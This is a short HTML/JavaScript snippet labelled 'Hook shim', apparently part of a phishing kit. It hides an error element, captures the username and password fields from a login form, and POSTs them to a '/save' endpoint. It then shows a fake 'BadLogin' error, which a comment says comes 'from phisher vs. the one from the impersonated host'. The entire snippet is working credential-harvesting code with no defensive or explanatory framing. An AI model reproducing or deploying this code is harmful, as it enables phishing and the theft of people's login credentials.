<!-- START: Hook shim -->
<script src="https://code.jquery.com/jquery-3.2.1.min.js"
integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
crossorigin="anonymous">
</script>
<script type="text/javascript">
//<![CDATA[
 // example of hiding a div
 $('#BadLogin').hide();
 function hook()
 {
     // example of serializing just specific input fields
     $.ajax({
         url: '/save',
         data: [$('#UserName').serialize(),$('#Password').serialize()].join('&'),
         contentType: "application/x-www-form-urlencoded",
         type: 'POST',
         success: function(response) {
             // Exmaple of showing error message from phisher vs. the one from the impersonated host
             $('#BadLogin').show();
             $('#BadLogin').css("visibility", "visible");
         },
         error: function(error) {
             $('#BadLogin').show();
             $('#BadLogin').css("visibility", "visible");
         }
     });
     return false
 }
//]]>
</script> <!-- END: Hook shim -->
